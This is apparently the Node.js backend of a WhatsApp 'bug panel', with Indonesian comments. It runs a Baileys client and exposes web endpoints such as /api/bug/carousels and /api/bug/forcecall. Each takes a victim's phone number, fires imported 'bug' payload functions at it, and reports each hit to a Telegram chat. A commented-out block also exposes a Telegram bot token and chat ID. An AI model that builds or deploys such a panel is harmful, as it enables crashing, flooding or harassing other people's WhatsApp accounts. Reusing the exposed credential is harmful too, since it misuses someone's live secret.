// index.js (Ini adalah file backend Node.js Anda)

console.clear();  
// --- PERBAIKAN: Path require() untuk config.js (sekarang di root) ---
require('./config'); 

console.log('Starting KepfoЯannaS Backend...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    jidDecode,   
    getContentType,   
    Browsers,   
    // MessageRetryMap, // Komentar: Hapus jika tidak digunakan
    // relayWAMessage // Komentar: Hapus jika tidak digunakan
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");  
const fs = require('fs');  
const express = require("express");  
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
const { Boom } = require('@hapi/boom');

// --- HAPUS: Redundansi Konfigurasi Global (sekarang hanya dari config.js) ---
// global.telegram_api_token = '7771429262:AAHwRR2VVM0Wlh1LWsmk9V3ZRifx8RZUU9Y'; 
// global.telegram_chat_id = '6878949999'; 
// global.creator = 'KepfoЯannaS'; 

// Import service modules (sekarang diasumsikan di root directory backend)
// --- PERBAIKAN: Path require() untuk modul service (sekarang di root) ---
const { carousels2, forceCall } = require('./bugs'); // Asumsi di root
const { getRequest, sendTele } = require('./telegram'); // Asumsi di root
const { konek } = require('./connect'); // Asumsi di root

const app = express();  
const PORT = process.env.PORT || 5036; 

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors()); 
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
// Melayani file statis dari folder public (frontend: index.html, app.js, styles.css)
// Ini tetap sama, karena frontend masih di public/
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

const usePairingCode = true; 

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve);   
    });  
}

async function clientstart() {
    const { state, saveCreds } = await useMultiFileAuthState(`./session`);
    const { version, isLatest } = await fetchLatestBaileysVersion(); 
    
    console.log(`Baileys version: ${version}, isLatest: ${isLatest}`); 
    
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !usePairingCode, 
        auth: state,
        browser: Browsers.macOS('Desktop'), 
    });
      
    if (usePairingCode && !client.authState.creds.registered) {
        const phoneNumber = await question('Please enter your WhatsApp number (e.g., 62812xxxxxx):\n> ');  
        const code = await client.requestPairingCode(phoneNumber.trim()); 
        console.log(`Your pairing code: ${code}`);  
    }

    // --- API Endpoints for Frontend (Bug Panel) ---
    app.get('/api/bug/carousels', async (req, res) => {
        const { target, fjids } = req.query; 
        
        if (!target) return res.status(400).json({
            status: false, 
            message: "Parameter 'target' diperlukan"
        });
        if (!fjids) return res.status(400).json({
            status: false,  
            message: "Parameter 'fjids' (OS) diperlukan"
        });  

        let formattedTarget = target.replace(/[^0-9]/g, ""); 
        if (formattedTarget.startsWith("0")) return res.status(400).json({
            status: false,
            message: "Gunakan awalan kode negara (misal: 62)!"
        });
        
        let jid = formattedTarget + '@s.whatsapp.net';
        const info = await getRequest(req); 

        try {
            await carousels2(client, jid, fjids); 
            
            res.json({
                status: true,
                creator: global.creator, // Mengambil dari global.creator di config.js
                result: `Successfully sent carousels (pairing code sim.) to ${target} for OS ${fjids}.`
            });
            console.log(`[API] Successfully sent carousels (pairing code sim.) to ${jid}`);

            const logMessage = `\n[API HIT]
Endpoint: Carousels (Pairing Code)
Target: ${target}
OS: ${fjids}
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            // Menggunakan global.telegram_api_token dan global.telegram_chat_id dari config.js
            if (global.telegram_api_token && global.telegram_chat_id) { 
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Carousels: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to send carousels: ${error.message}`
            });
        }
    });  
    
    app.get('/api/bug/forcecall', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "Parameter 'target' diperlukan"
        });

        let formattedTarget = target.replace(/[^0-9]/g, "");
        if (formattedTarget.startsWith("0")) return res.status(400).json({
            status: false,
            message: "Gunakan awalan kode negara (misal: 62)!"
        });
        
        let jid = formattedTarget + '@s.whatsapp.net';
        const info = await getRequest(req);

        try {
            await forceCall(client, jid);
            
            res.json({
                status: true,
                creator: global.creator,
                result: `Successfully sent forcecall to ${target}.`
            });
            console.log(`[API] Successfully sent forcecall to ${jid}`);

            const logMessage = `\n[API HIT]
Endpoint: Forcecall
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Forcecall: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to send forcecall: ${error.message}`
            });
        }
    });  

    app.get('/api/bug/no_target', async (req, res) => {
        const info = await getRequest(req);
        try {
            res.json({
                status: true,
                creator: global.creator,
                result: "Successfully executed 'no target' command."
            });
            console.log(`[API] Executed 'no target' command.`);
            
            const logMessage = `\n[API HIT]
Endpoint: No Target Command
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] No Target: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to execute 'no target' command: ${error.message}`
            });
        }
    });

    app.get('/api/bug/toggle_delay', async (req, res) => {
        const info = await getRequest(req);
        try {
            res.json({
                status: true,
                creator: global.creator,
                result: `Successfully toggled delay.`
            });
            console.log(`[API] Toggled delay command.`);

            const logMessage = `\n[API HIT]
Endpoint: Toggle Delay Command
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Toggle Delay: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to toggle delay: ${error.message}`
            });
        }
    });

    app.get('/api/bot_status', async (req, res) => {
        const botOnlineStatus = client.user ? true : false; 
        res.json({
            status: true,
            botOnline: botOnlineStatus,
            message: `Bot is currently ${botOnlineStatus ? 'Online' : 'Offline'}.`
        });
    });
   
    client.ev.on('connection.update', (update) => {
        konek({ 
            client, 
            update, 
            clientstart, 
            DisconnectReason,
            Boom
        });  
    });  
    
    client.ev.on('creds.update', saveCreds);  
    
    return client;
}
      
clientstart();

// --- Express Server Startup ---
app.get('/', (req, res) => {
  // --- PERBAIKAN: Path index.html di public folder ---
  res.sendFile(path.join(__dirname, 'public', 'index.html')); 
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); 
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
      // Perhatikan: PORT di sini adalah local scope, tidak akan mengubah variabel di luar
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});

// Watch for file changes (for development)
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file);  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m');  
  delete require.cache[file];  
  require(file);  
});